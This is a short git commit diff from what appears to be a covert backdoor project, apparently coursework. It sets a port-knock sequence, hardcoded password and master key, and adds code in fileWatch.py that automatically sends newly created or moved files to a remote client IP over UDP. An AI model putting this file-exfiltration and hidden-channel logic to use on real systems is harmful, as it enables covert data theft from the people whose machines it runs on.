c527ef7f71a99a1eb7f9c25e7c52da9eafd22207
brij <brijshah0@gmail.com>
2015-11-28 23:02:30 -0800

    server changes

--- configfile.py
+++ configfile.py
@@ -1,5 +1,5 @@
 ip = "192.168.15.12"
 password = "abcdefyoyo"
-protocol = "tcp"
+protocol = "udp"
 knock = [1000, 2000, 3000]
 masterkey = "12345678901234567890123456789012"
--- fileWatch.py
+++ fileWatch.py
@@ -13,16 +13,17 @@ class FileWatch(FileSystemEventHandler):
 
   def on_created(self, event):
     print "File created: " + event.src_path
+    print "calling send file"
+    helpers.sendFile(self.clientIP, event.src_path, self.protocol, 6000, self.password)
     # helpers.sendFile(clientIP, event.src_path)
 
   def on_deleted(self, event):
     print "File deleted: " + event.src_path
-    # send a message saying the file was deleted
+    # send a message saying the file was deleted? how do we want to implement
+    # this, since the client just always assumes the results from file watch will
+    # be file data that it needs to save to some file output.
 
   def on_moved(self, event):
     print "File moved: " + event.src_path + " to " + event.dest_path
-    message = self.password + "File moved: " + event.src_path + " to " + event.dest_path
-    print self.password
-    encryptedMessage = encryption.encrypt(message, self.masterkey)
-    # send message saying file moved
-    helpers.sendMessage(encryptedMessage, self.password, self.protocol, self.clientIP, 6000)
+    print "calling send file"
+    helpers.sendFile(self.clientIP, event.dest_path, self.protocol, 6000, self.password)
